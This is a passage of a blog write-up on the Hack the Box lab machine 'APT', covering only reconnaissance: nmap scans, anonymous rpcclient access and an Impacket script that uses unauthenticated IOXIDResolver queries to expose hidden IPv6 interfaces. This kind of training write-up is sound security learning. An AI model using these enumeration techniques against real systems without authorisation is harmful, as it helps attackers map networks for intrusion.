<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - APT Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the insane-difficulty machine APT from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the insane-difficulty machine APT from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/apt/" /><meta property="og:url" content="https://zweilosec.github.io/posts/apt/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/apt-0-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-01T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/apt-0-infocard.png" /><meta property="twitter:title" content="Hack the Box - APT Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2021-04-01T14:00:00+00:00","description":"Zweilosec’s writeup on the insane-difficulty machine APT from https://hackthebox.eu","headline":"Hack the Box - APT Writeup","image":"https://zweilosec.github.io/assets/img/apt-0-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/apt/"},"url":"https://zweilosec.github.io/posts/apt/"}</script><title>Hack the Box - APT Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - APT Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - APT Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Apr 1, 2021, 2:00 PM +0000" prep="on" > Apr 1, 2021 <i class="unloaded">2021-04-01T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="8106 words">45 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---apt">HTB - APT</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-0-infocard.png" alt="Information card for the Hack the Box machine APT" /></p><p>This Windows insane-difficulty machine was quite challenging, but mostly due to its use of some unconventional settings. Breaking in involved many of the normal enumeration and privilege escalation techniques that are used against Windows machines, but some tweaks by the administrator made it more challenging to find out how to even begin. This machine gave me a chance to learn a lot about using some of the standard Impacket tools in new ways, such as using Kerberos tickets along with IPv6. I hope you enjoy this challenge as much as I did!</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="using-a-kerberos-ticket-with-impacket-tools">Using a Kerberos ticket with Impacket tools</h3><ol><li>First, capture a valid Kerberos ticket using the user’s password hash and <code class="language-plaintext highlighter-rouge">GetTGT.py</code>.<li>Export the ticket using the command <code class="language-plaintext highlighter-rouge">export KRB5CCNAME=$user@$hostname.ccache</code><li>Use this ticket in other Impacket tools for authentication by using the <code class="language-plaintext highlighter-rouge">-k</code> argument.</ol><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.213</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ nmap -sCV -n -p- -Pn -vvvv -oA apt 10.10.10.213
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

PORT    STATE SERVICE REASON  VERSION
80/tcp  open  http    syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 132.93 seconds
</pre></table></code></div></div><p>Nmap only reported that two ports were open, 80 - HTTP (IIS) and 135 - RPC.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-1-trustsec.png" alt="A screenshot of the Gigantic Hosting website on port 80" /></p><p>I navigated my web browser to the target IP address and found a website for a hosting company called Gigantic Hosting. It offered security services for all hosted servers. I found an email address associated with this <code class="language-plaintext highlighter-rouge">sales@gigantichosting.com</code>, and a phone number <code class="language-plaintext highlighter-rouge">(818) 995-1560</code>.</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- Mirrored from 10.13.38.16/ by HTTrack Website Copier/3.x [XR&amp;CO'2014], Mon, 23 Dec 2019 08:12:54 GMT --&gt;</span>
</pre></table></code></div></div><p>In the source code of the website I saw an IP <code class="language-plaintext highlighter-rouge">10.13.38.16/</code> mentioned in a comment alongside <code class="language-plaintext highlighter-rouge">HTTrack Website Copier/3.x</code>. It looked like this website had been mirrored from this IP. I tried to connect to it but there did not seem to be any hosts located there.</p><ul><li><a href="https://seclists.org/fulldisclosure/2017/May/89">https://seclists.org/fulldisclosure/2017/May/89</a><li><a href="https://packetstormsecurity.com/files/131160/HTTrack-Website-Copier-3.48-21-DLL-Hijacking.html">https://packetstormsecurity.com/files/131160/HTTrack-Website-Copier-3.48-21-DLL-Hijacking.html</a><li><a href="https://en.kali.tools/?p=443&amp;PageSpeed=noscript">https://en.kali.tools/?p=443&amp;PageSpeed=noscript</a></ul><p>I also looked up vulnerability information regarding the website copier, but did not find anything useful.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-2-wappalyzer.png" alt="Image of the Wappalyzer plugin with version information" /></p><p>Wappalyzer told me this site was hosted on IIS 10, and that it was using jQuery 1.11.0, but this did not give me any leads.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-5-about.png" alt="Image of the about page" /></p><p>I continued my enumeration of the website, but most of the pages on the site did not contain anything useful or interesting.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-1-dirbuster.png" alt="Dirbuster output showing many files and folders" /></p><p>I checked my <code class="language-plaintext highlighter-rouge">dirbuster</code> output to see if there were any interesting files or folders, but even after going through the entire raft wordlist I was not able to find anything that normal enumeration of the site didn’t reveal.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-6-XSS-support.png" alt="Image of the support contact form I attempted XSS and SQLi on" /></p><p>The <code class="language-plaintext highlighter-rouge">/support.html</code> page had a contact form that I tried some basic XSS and SQLi payloads against.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-7-alert.png" alt="Image of the Firefox security warning page" /></p><p>However when I submitted the form it redirected me to the IP I had seen in a comment in the source code of the website. This comment form had not been updated and was still pointing towards the site it had been copied from <code class="language-plaintext highlighter-rouge">(10.13.38.16)</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-8-certificate.png" alt="Certificate information for 10.13.38.16" /></p><p>I opened the certificate information that was presented for this site since it was using HTTPS, but there was nothing interesting to be found.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-9.5-fail2.png" alt="Burp output showing a failed connection to 10.13.38.16" /></p><p>I captured my request in Burp to see if it leaked any information about the site, but it also failed to connect. I also could not ping that IP. This seemed like it was not the way forward.</p><h3 id="port-135---rpc">Port 135 - RPC</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ rpcclient -I 10.10.10.213 -U "" -N apt.htb -p 135           
Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
</pre></table></code></div></div><p>Since port 80 seemed to be a dead end, I moved on to port 135. However, I also wasn’t able to connect to the machine using <code class="language-plaintext highlighter-rouge">rpcclient</code>. I seemed to have hit another dead end. I decided to do some research on how to enumerate RPC without authentication.</p><ul><li><a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4622f7dc-5ccb-4aa1-80e6-b93fd796a55a">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4622f7dc-5ccb-4aa1-80e6-b93fd796a55a</a></ul><p>I found one promising article that described how you could use the <code class="language-plaintext highlighter-rouge">IOXIDResolver</code> interface to resolve the network interfaces of the the remote host, and even included a python script proof of concept using the <code class="language-plaintext highlighter-rouge">Impacket</code> library.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">getopt</span>

<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5</span> <span class="kn">import</span> <span class="n">transport</span>
<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.rpcrt</span> <span class="kn">import</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>
<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.dcomrt</span> <span class="kn">import</span> <span class="n">IObjectExporter</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">):</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">opts</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span><span class="s">"ht:"</span><span class="p">,[</span><span class="s">"target="</span><span class="p">])</span>
    <span class="k">except</span> <span class="n">getopt</span><span class="p">.</span><span class="n">GetoptError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="n">target_ip</span> <span class="o">=</span> <span class="s">"10.10.10.213"</span>

    <span class="k">for</span> <span class="n">opt</span><span class="p">,</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="s">'-h'</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
        <span class="k">elif</span> <span class="n">opt</span> <span class="ow">in</span> <span class="p">(</span><span class="s">"-t"</span><span class="p">,</span> <span class="s">"--target"</span><span class="p">):</span>
            <span class="n">target_ip</span> <span class="o">=</span> <span class="n">arg</span>

    <span class="n">authLevel</span> <span class="o">=</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>

    <span class="n">stringBinding</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'ncacn_ip_tcp:%s'</span> <span class="o">%</span> <span class="n">target_ip</span>
    <span class="n">rpctransport</span> <span class="o">=</span> <span class="n">transport</span><span class="p">.</span><span class="n">DCERPCTransportFactory</span><span class="p">(</span><span class="n">stringBinding</span><span class="p">)</span>

    <span class="n">portmap</span> <span class="o">=</span> <span class="n">rpctransport</span><span class="p">.</span><span class="n">get_dce_rpc</span><span class="p">()</span>
    <span class="n">portmap</span><span class="p">.</span><span class="n">set_auth_level</span><span class="p">(</span><span class="n">authLevel</span><span class="p">)</span>
    <span class="n">portmap</span><span class="p">.</span><span class="n">connect</span><span class="p">()</span>

    <span class="n">objExporter</span> <span class="o">=</span> <span class="n">IObjectExporter</span><span class="p">(</span><span class="n">portmap</span><span class="p">)</span>
    <span class="n">bindings</span> <span class="o">=</span> <span class="n">objExporter</span><span class="p">.</span><span class="n">ServerAlive2</span><span class="p">()</span>

    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Retrieving network interface of "</span> <span class="o">+</span> <span class="n">target_ip</span><span class="p">)</span>

    <span class="c1">#NetworkAddr = bindings[0]['aNetworkAddr']
</span>    <span class="k">for</span> <span class="n">binding</span> <span class="ow">in</span> <span class="n">bindings</span><span class="p">:</span>
        <span class="n">NetworkAddr</span> <span class="o">=</span> <span class="n">binding</span><span class="p">[</span><span class="s">'aNetworkAddr'</span><span class="p">]</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Address: "</span> <span class="o">+</span> <span class="n">NetworkAddr</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
   <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
</pre></table></code></div></div><p>I copied the PoC from the site and modified the script to scan the IP of my target.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 IOXIDResolver.py 10.10.10.213
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::4d93:3f31:7ea4:6f57
</pre></table></code></div></div><p>After running the script, I was presented with the hostname (I assume), the IPv4 address, and two IPv6 addresses. I added <code class="language-plaintext highlighter-rouge">apt</code> as an alias for this IPv6 address in my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ ping -c 2 -6 dead:beef::b885:d62a:d679:573f                                                    1 ⨯
PING dead:beef::b885:d62a:d679:573f(dead:beef::b885:d62a:d679:573f) 56 data bytes
64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=1 ttl=63 time=68.4 ms
64 bytes from dead:beef::b885:d62a:d679:573f: icmp_seq=2 ttl=63 time=65.4 ms

--- dead:beef::b885:d62a:d679:573f ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 65.438/66.913/68.389/1.475 ms
</pre></table></code></div></div><p>I was relieved to find that I was able to ping the machine using the IPv6 address. The TTL of 64 was a bit odd, bu I wasn’t not sure if it was normal for IPv6. It showed 127 like normal when pinging the IPv4 address.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ rpcclient -I dead:beef::b885:d62a:d679:573f -U "" -N apt
rpcclient $&gt;
</pre></table></code></div></div><p>Using this IPv6 address with <code class="language-plaintext highlighter-rouge">rpcclient</code> I was able to connect anonymously.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>rpcclient $&gt; lsaquery
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $&gt; srvinfo
        APT.HTB        Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
</pre></table></code></div></div><p>After getting <code class="language-plaintext highlighter-rouge">NT_STATUS_ACCESS_DENIED</code> for all of my commands I was starting to think I wasn’t going to get anything, but finaly one command returned something. I got the hostname of <code class="language-plaintext highlighter-rouge">APT.HTB</code> using the <code class="language-plaintext highlighter-rouge">lsaquery</code> command. I went through a lot of the other commands, but wasn’t able to get anything else out of this.</p><h3 id="nmap---ipv6">nmap - IPv6</h3><p>Since RPC did not seem to give up much information, I decided to try scanning this new network interface to see if there was anything different that I could find.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ nmap -sCV -n -p- -Pn -vvvv -oA apt.ipv6 apt.htb

PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2021-03-29 01:18:57Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
3269/tcp  open  ssl/ldap     syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
49673/tcp open  msrpc        syn-ack Microsoft Windows RPC
49679/tcp open  msrpc        syn-ack Microsoft Windows RPC
49687/tcp open  msrpc        syn-ack Microsoft Windows RPC
